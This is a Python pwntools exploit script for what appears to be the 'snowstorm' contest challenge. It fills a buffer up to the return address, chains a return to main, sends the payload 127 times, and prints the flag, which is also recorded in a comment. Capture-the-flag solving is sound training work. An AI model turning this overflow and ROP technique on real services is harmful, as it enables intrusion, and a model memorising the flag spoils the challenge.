import os
import pwn

def main():
    exe_path: str = f"{os.path.dirname(__file__)}/snowstorm"
    hostname: str = "localhost"
    port: int | str = "1089"
    ssl: bool = False
    gdbscript = "\n".join((
        "c",
    ))

    exe = pwn.ELF(exe_path)
    pwn.context.binary = exe
    io = connect(hostname, port, ssl, (exe.path, ), gdbscript, default_mode="local")

    # Create ROP
    rop = pwn.ROP(exe)
    rop.raw(b"a"*(40+4+4+8))    # filling until the return address
    rop.call("main")            # ret2main
    payload = rop.chain()

    for _ in range(127):
        io.sendafter(b": ", b"0x40")    # Give hexadecimal number to strtol
        io.sendafter(b"> ", payload)    # ROP

    io.recvuntil(b"\"\n")
    flag = io.recvuntil(b"}")   # Get flag
    print(flag)                 # srdnlen{39.22N_9.12E_4nd_I'll_C0n71Nu3_70_7R4n5M1t_7h15_M355463}


from typing import Literal
def connect(
        hostname: str = "", port: int | str = "", ssl: bool = False,
        argv: tuple | str = (), gdbscript: str = "",
        default_mode: Literal["remote", "local", "gdb"] = "remote"
    ) -> pwn.tube:

    if pwn.args.REMOTE:
        mode = "remote"
    elif pwn.args.GDB:
        mode = "gdb"
    elif pwn.args.LOCAL:
        mode = "local"
    else:
        mode = default_mode

    match mode:
        case "remote":
            assert hostname and port, "Unprovided arguments for remote execution"
            return pwn.remote(hostname, port, ssl=ssl)
        
        case "local":
            assert argv, "Unprovided arguments for local execution"
            if isinstance(argv, str):
                exe_cwd = os.path.dirname(argv)
            else:
                exe_cwd = os.path.dirname(argv[0])
            return pwn.process(argv, cwd=exe_cwd)
        
        case "gdb":
            assert argv, "Unprovided arguments for debug execution"
            return pwn.gdb.debug(argv, gdbscript)
        
        case _: raise ValueError("Unknown mode")

if __name__ == "__main__":
    main()
